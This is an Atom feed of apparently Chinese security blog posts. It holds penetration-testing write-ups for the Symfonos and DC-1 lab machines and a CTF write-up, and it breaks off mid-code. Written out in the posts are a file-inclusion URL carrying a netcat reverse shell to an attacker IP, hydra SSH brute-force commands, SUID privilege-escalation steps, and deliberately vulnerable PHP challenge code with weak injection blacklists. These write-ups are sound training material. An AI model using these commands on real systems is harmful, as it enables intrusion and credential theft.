<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>XZLang</title>
  
  <subtitle>Nothing is true.Everything is permitted.</subtitle>
  <link href="http://yoursite.com/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-08-17T03:18:38.622Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/08/17/hello-world/"/>
    <id>http://yoursite.com/2020/08/17/hello-world/</id>
    <published>2020-08-17T03:18:38.622Z</published>
    <updated>2020-08-17T03:18:38.622Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java安全初步</title>
    <link href="http://yoursite.com/2020/08/11/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5/"/>
    <id>http://yoursite.com/2020/08/11/Java%E5%AE%89%E5%85%A8%E5%88%9D%E6%AD%A5/</id>
    <published>2020-08-11T05:59:42.000Z</published>
    <updated>2020-08-11T06:00:08.624Z</updated>
    
    <content type="html"><![CDATA[<p>之前一直没有系统的对Javaweb的安全做一个系统的学习和总结，主要原因也是没有怎么熟悉Javaweb的开发细节，在学习了一段时间的Javaweb之后，决定开始就Javaweb代码层面的安全做以学习和总结。</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前一直没有系统的对Javaweb的安全做一个系统的学习和总结，主要原因也是没有怎么熟悉Javaweb的开发细节，在学习了一段时间的Javaweb之后，决定开始就Javaweb代码层面的安全做以学习和总结。&lt;/p&gt;</summary>
    
    
    
    <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
    <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透系列</title>
    <link href="http://yoursite.com/2020/08/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97/"/>
    <id>http://yoursite.com/2020/08/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%B3%BB%E5%88%97/</id>
    <published>2020-08-11T02:16:52.000Z</published>
    <updated>2020-08-11T02:16:52.098Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Oracle安全漫谈</title>
    <link href="http://yoursite.com/2020/08/10/Oracle%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/"/>
    <id>http://yoursite.com/2020/08/10/Oracle%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/</id>
    <published>2020-08-10T13:22:16.000Z</published>
    <updated>2020-08-10T13:22:16.187Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Symfonos3-shellshock</title>
    <link href="http://yoursite.com/2020/08/03/Symfonos3-%E5%97%AF%E5%91%90%E5%97%AF%E5%91%90/"/>
    <id>http://yoursite.com/2020/08/03/Symfonos3-%E5%97%AF%E5%91%90%E5%97%AF%E5%91%90/</id>
    <published>2020-08-03T05:03:45.000Z</published>
    <updated>2020-08-03T14:35:09.981Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>主机开了21，22，80端口，然后用dirb扫一下目录看看</p><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>扫出了<code>cgi-bin</code>，接着扫，在<code>cgi-bin</code>目录下扫到了一个<code>underworld</code>目录</p><p>访问</p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>显然这个页面的显示是uptime命令的回显结果</p><p>这里是一个<code>shellshock</code>的漏洞，直接用MSF的EXP一把梭</p><p><img src= "/img/loading.gif" data-lazy-src="5.png"></p><p>拿到shell之后，考虑提权</p><p>先用<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linPEAS</a>脚本跑一下</p><p>然后可以找到<code>tcpdump</code>的<code>cap</code></p><p><img src= "/img/loading.gif" data-lazy-src=".png"></p><p>下载工具pyps</p><blockquote><p>wget <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64/">https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64\</a></p><p>pspy是一种命令行工具，旨在无需root权限即可监听进程。它使您可以查看其他用户执行的命令，cron作业等。非常适合枚举CTF中的Linux系统。很好地向您的同事展示为什么在命令行中将秘密作为参数传递是一个坏主意。<br> 该工具从procfs扫描中收集信息。放置在文件系统选定部分上的Inotify观察程序将触发这些扫描，以捕获短暂的进程。</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p><strong>ftp协议是明文传输的</strong>，如果能抓到ftp的包，那就可以得到账号密码了。那么使用什么工具抓包呢？比较常用的是<strong>tcpdump</strong>，查看靶机上是否安装了tcpdump，命令：<code>tcpdump --version</code></p><blockquote><p>tcpdump -i lo -w ftp.pcap</p><p>开启临时的HTTP服务</p><p>python -m SimpleHTTPServer 9999</p><p>在Kali上下载</p><p>wget <a href="http://192.168.40.160:9999/ftp.pcap">http://192.168.40.160:9999/ftp.pcap</a></p></blockquote><p>然后wireshark分析一下就有用户名密码了</p><p><img src= "/img/loading.gif" data-lazy-src="8.png"></p><p>然后直接ssh登录</p><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p><p>刚才使用pspy工具的时候发现，ftpclient.py是以root身份运行的，如果hades用户具有对ftpclient.py脚本的写入权限，那么就可以提权。但是这里没有权限，那么我们考虑来看看hades对那些文件有可写权限</p><blockquote><p>find / -writable -type d 2&gt;/dev/null</p></blockquote><p>发现好东西了</p><p><img src= "/img/loading.gif" data-lazy-src="10.png"></p><p>然后考虑对ftpclient.py文件中导入的ftplib模块的源码进行修改</p><p><img src= "/img/loading.gif" data-lazy-src="11.png"></p><p>如图，现在监听端口，就可以接到root的反弹shell</p><p><img src= "/img/loading.gif" data-lazy-src="12.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Symfnons" scheme="http://yoursite.com/tags/Symfnons/"/>
    
  </entry>
  
  <entry>
    <title>Symfonos2:啊这啊这</title>
    <link href="http://yoursite.com/2020/07/22/Symfonos2-%E5%95%8A%E8%BF%99%E5%95%8A%E8%BF%99/"/>
    <id>http://yoursite.com/2020/07/22/Symfonos2-%E5%95%8A%E8%BF%99%E5%95%8A%E8%BF%99/</id>
    <published>2020-07-22T09:11:08.000Z</published>
    <updated>2020-07-22T13:10:07.860Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p>照常扫扫</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>139端口和445端口开着，先连上共享文件</p><p>整出来一个<code>log.txt</code>文件</p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>审计这个日志，发现用户名是<code>aeolus</code></p><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>然后没有其他信息的情况下，试试爆破ssh</p><blockquote><p>hydra -l aeolus -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.40.156</p></blockquote><p>爆出来密码<code>sergioteamo</code></p><p>然后连上</p><p>上去用nmap扫自己，扫出了好东西</p><p><img src= "/img/loading.gif" data-lazy-src="6.png"></p><p>看看这个8080端口，只允许本地访问，这个好办，直接端口转发</p><blockquote><p>ssh  -L 8080:127.0.0.1:8080 <a href="mailto:&#x61;&#101;&#111;&#108;&#117;&#115;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x31;&#x31;&#46;&#49;&#x32;&#57;">&#x61;&#101;&#111;&#108;&#117;&#115;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x31;&#x31;&#46;&#49;&#x32;&#57;</a></p></blockquote><p>然后访问一下</p><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p>是个叫做librenms的站，MSF搜到exp，直接一把梭拿到shell</p><p>然后MySQL提权成root</p><p><img src= "/img/loading.gif" data-lazy-src="8.png"></p><p>拿到final flag</p><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Symfonos" scheme="http://yoursite.com/tags/Symfonos/"/>
    
    <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
    <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Symfonos:SMTP与LFI</title>
    <link href="http://yoursite.com/2020/07/20/Symfonos-SMTP%E4%B8%8ELFI/"/>
    <id>http://yoursite.com/2020/07/20/Symfonos-SMTP%E4%B8%8ELFI/</id>
    <published>2020-07-20T06:35:22.000Z</published>
    <updated>2020-07-20T09:11:47.602Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>扫出靶机IP</p><p>然后用nmap来获取主机信息</p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>可以看到，主机开启了25端口的SMTP服务</p><p>于是直接连接上共享</p><blockquote><p>smb://192.168.40.155</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>然后打开不需要密码的目录</p><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>这里基本上给了信息，用这几个密码尝试连接helios目录，发现qwerty可以</p><p><img src= "/img/loading.gif" data-lazy-src="5.png"></p><p>访问<code>h3l105</code>，发现了一个<code>wordpress</code>搭建的站点</p><p><img src= "/img/loading.gif" data-lazy-src="6.png"></p><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p>点击链接会跳转到<code>http://symfonos.local</code>，所以在本机的hosts里面加上这个IP和域名的映射</p><p>因为是WP搭的站，直接用wpscan扫一下</p><blockquote><p>wpscan –url <a href="http://symfonos.local/h3l105">http://symfonos.local/h3l105</a></p></blockquote><p>扫到了两个插件</p><p><img src= "/img/loading.gif" data-lazy-src="8.png"></p><p>然后去<code>searchsploit</code>试试，扫出来两个洞，其中有个本地文件包含</p><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p><p>然后根据给定的poc去尝试漏洞</p><p><img src= "/img/loading.gif" data-lazy-src="10.png"></p><p>那么联系到之前扫到的25端口的smtp服务，可以试图通过邮件污染的方法进行RCE</p><p><img src= "/img/loading.gif" data-lazy-src="11.png"></p><p>发送一个有问题的邮件，然后弹一个shell过来</p><blockquote><p>[<a href="http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc%20-e%20/bin/bash%20192.168.40.150%201551%5D">http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc%20-e%20/bin/bash%20192.168.40.150%201551]</a>(<a href="http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc">http://192.168.40.155/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&amp;cmd=nc</a> -e /bin/bash 192.168.40.150 1551)</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="12.png"></p><p>接下来是提权，先考虑suid的方法</p><p><img src= "/img/loading.gif" data-lazy-src="13.png"></p><p>发现了一个可疑的文件</p><p>strings一下这个文件，发现了一个更加可疑的curl命令</p><p><img src= "/img/loading.gif" data-lazy-src="14.png"></p><p>此时的思路是，statuscheck文件执行的时候，会从环境变量里面获得curl的目录，然后执行curl命令，那么我们如果伪造curl文件，并写入环境变量中，就可以提权</p><p><img src= "/img/loading.gif" data-lazy-src="15.png"></p><p>通过这个思路，我们成功提权</p><p>并且拿到flag</p><p><img src= "/img/loading.gif" data-lazy-src="16.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="Symfonos" scheme="http://yoursite.com/tags/Symfonos/"/>
    
    <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
    <category term="LFI" scheme="http://yoursite.com/tags/LFI/"/>
    
  </entry>
  
  <entry>
    <title>DC-1:SUID提权初体验</title>
    <link href="http://yoursite.com/2020/07/18/DC-1-find%E6%8F%90%E6%9D%83%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2020/07/18/DC-1-find%E6%8F%90%E6%9D%83%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2020-07-17T16:31:00.000Z</published>
    <updated>2020-07-18T06:55:04.046Z</updated>
    
    <content type="html"><![CDATA[<p>日常靶机</p><a id="more"></a><p> 靶机开启，直接<code>arp-san -l</code></p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>扫到IP之后nmap扫着看看</p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>可以看到开启了22,80端口，用工具可以看到CMS为<code>drupal</code></p><p><img src= "/img/loading.gif" data-lazy-src="3.png"></p><p>直接启动MSF</p><blockquote><p>service postgressql start</p><p>msfdb init</p><p>msfconsole</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="4.png"></p><p>打进去了，然后通过python拿到shell</p><p><img src= "/img/loading.gif" data-lazy-src="5.png"></p><p>翻翻找找，在home目录里面拿到了一个hint</p><p><img src= "/img/loading.gif" data-lazy-src="6.png"></p><h2 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h2><p>根据这句提示，我们可以想到通过SUID的可执行文件来提权</p><p>以下几个命令可以用来找到系统中运行的SUID文件</p><blockquote><p>find / -user root -perm -4000 -print 2&gt;/dev/null </p><p>find / -perm -u=s -type f 2&gt;/dev/null </p><p>find / -perm -4000 2&gt; /dev/null</p><p>find / -user root -perm -4000 -exec ls -ldb {} ;</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="7.png"></p><p>有find，好办了，直接利用find执行命令</p><p><img src= "/img/loading.gif" data-lazy-src="8.png"></p><p>提权成功，可以在root目录里面拿flag了</p><p>当然，这种玩法没有拿到所有flag，我们继续</p><h2 id="打数据库admin"><a href="#打数据库admin" class="headerlink" title="打数据库admin"></a>打数据库admin</h2><p>在网站目录下的setting.php文件下我们找到了flag2以及数据库的用户名密码</p><p><img src= "/img/loading.gif" data-lazy-src="9.png"></p><p>登上数据库后发现有一个<code>users</code>的表</p><p><img src= "/img/loading.gif" data-lazy-src="10.png"></p><p>打开看看</p><p><img src= "/img/loading.gif" data-lazy-src="11.png"></p><p>这里想要搞到admin的密码，可以先搜一下有无可用的EXP</p><p><img src= "/img/loading.gif" data-lazy-src="12.png"></p><p>直接就有一个可以添加管理员账号的EXP，直接打</p><p><img src= "/img/loading.gif" data-lazy-src="13.png"></p><p>然后再看看数据库</p><p><img src= "/img/loading.gif" data-lazy-src="14.png"></p><p>妥了，直接登录，得到flag3</p><p><img src= "/img/loading.gif" data-lazy-src="15.png"></p><p>这里提示我们去看shadow文件，我们利用上面的方式提权至root，去看看</p><p><img src= "/img/loading.gif" data-lazy-src="16.png"></p><h2 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h2><p>可以知道有个flag4的用户，可以用ssh登录来爆破这个用户的密码</p><p>用hydra爆破一下，密码是orange，直接登录</p><blockquote><p>hydra -l flag4 -P /usr/share/wordlists/metasploit/unix_passwords.txt  ssh://192.168.40.154</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="17.png"></p><p>登录然后拿到flag4</p><p><img src= "/img/loading.gif" data-lazy-src="18.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常靶机&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="DC-1" scheme="http://yoursite.com/tags/DC-1/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-WriteUp合集(3)</title>
    <link href="http://yoursite.com/2020/05/20/BUUCTF-WriteUp%E5%90%88%E9%9B%86-3/"/>
    <id>http://yoursite.com/2020/05/20/BUUCTF-WriteUp%E5%90%88%E9%9B%86-3/</id>
    <published>2020-05-20T15:25:55.000Z</published>
    <updated>2020-05-20T15:27:06.296Z</updated>
    
    <content type="html"><![CDATA[<p>刷题记录：</p><a id="more"></a>]]></content>
    
    
    <summary type="html">&lt;p&gt;刷题记录：&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF-WriteUp合集(2)</title>
    <link href="http://yoursite.com/2020/05/19/BUUCTF-WriteUp%E5%90%88%E9%9B%86-2/"/>
    <id>http://yoursite.com/2020/05/19/BUUCTF-WriteUp%E5%90%88%E9%9B%86-2/</id>
    <published>2020-05-19T10:37:38.000Z</published>
    <updated>2020-05-20T15:17:53.774Z</updated>
    
    <content type="html"><![CDATA[<p>刷题记录</p><a id="more"></a><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>知识点：</p><ul><li><p>Smarty SSTI</p></li><li><p>XFF</p><p>题目打开后，提示了<code>Build With Smarty !</code>，于是猜测存在<code>Smarty SSTI</code>，右上角有回显的IP。然后题目提示有XXF，抓个包直接改XFF为<code>Smarty SSTI</code>的payload，没想到直接打通了。</p></li></ul><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>关于Smarty SSTI可以看这篇文章</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/91595921">https://zhuanlan.zhihu.com/p/91595921</a></p></blockquote><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>看前端源码的注释</p><p><img src= "/img/loading.gif" data-lazy-src="2.png"></p><p>怀疑有文件包含，伪协议直接读文件内容，成功</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]) ? $_GET[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|/i&quot;</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>change.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.$address.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.$row[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;è®¢åä¿®æ¹æå&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>search.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $pattern = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">&quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">&quot;&lt;p&gt;å§å:&quot;</span>.$row[<span class="string">&#x27;user_name&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, çµè¯:&quot;</span>.$row[<span class="string">&#x27;phone&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&lt;p&gt;, å°å:&quot;</span>.$row[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">&quot;æªæ¾å°è®¢å!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 